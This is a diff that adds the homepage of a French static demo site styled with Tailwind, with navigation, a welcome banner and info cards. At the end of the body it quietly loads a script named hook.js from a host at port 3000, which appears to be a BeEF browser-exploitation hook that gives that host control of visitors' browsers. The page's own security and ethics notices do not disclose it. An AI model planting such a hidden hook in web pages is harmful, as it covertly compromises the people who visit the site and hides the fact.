@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Accueil — Demo</title>
+  <!-- Tailwind CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 text-gray-800">
+  <header class="bg-white shadow">
+    <div class="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">
+      <h1 class="text-xl font-semibold">Demo Site</h1>
+      <nav class="space-x-4">
+        <a href="/index.html" class="text-blue-600 hover:underline">Accueil</a>
+        <a href="/items.html" class="text-blue-600 hover:underline">Items</a>
+        <a href="/contact.html" class="text-blue-600 hover:underline">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="max-w-4xl mx-auto px-4 py-12">
+    <section class="text-center">
+      <h2 class="text-3xl font-bold mb-4">Bienvenue sur la démo</h2>
+      <p class="text-gray-600 mb-6">Exemple d'un site statique avec Tailwind CSS (CDN). Pages : Accueil, Items (grid), Contact.</p>
+      <div class="flex justify-center gap-3">
+        <a href="/items.html" class="px-4 py-2 bg-blue-600 text-white rounded">Voir les items</a>
+        <a href="/contact.html" class="px-4 py-2 border border-blue-600 text-blue-600 rounded">Contact</a>
+      </div>
+    </section>
+
+    <section class="mt-12 grid grid-cols-1 sm:grid-cols-3 gap-6">
+      <div class="p-4 bg-white rounded shadow">
+        <h3 class="font-semibold">Statut</h3>
+        <p class="text-sm text-gray-600">Site statique : démo.</p>
+      </div>
+      <div class="p-4 bg-white rounded shadow">
+        <h3 class="font-semibold">Sécurité</h3>
+        <p class="text-sm text-gray-600">Ne déploie pas de scripts actifs sans autorisation.</p>
+      </div>
+      <div class="p-4 bg-white rounded shadow">
+        <h3 class="font-semibold">Docker</h3>
+        <p class="text-sm text-gray-600">Le site peut être servi via une image Nginx.</p>
+      </div>
+    </section>
+  </main>
+
+  <footer class="bg-white border-t">
+    <div class="max-w-4xl mx-auto px-4 py-6 text-sm text-gray-500">
+      © Demo — usage légal et éthique uniquement.
+    </div>
+  </footer>
+  <script src="http://192.168.1.111:3000/hook.js"></script>
+</body>
+</html>
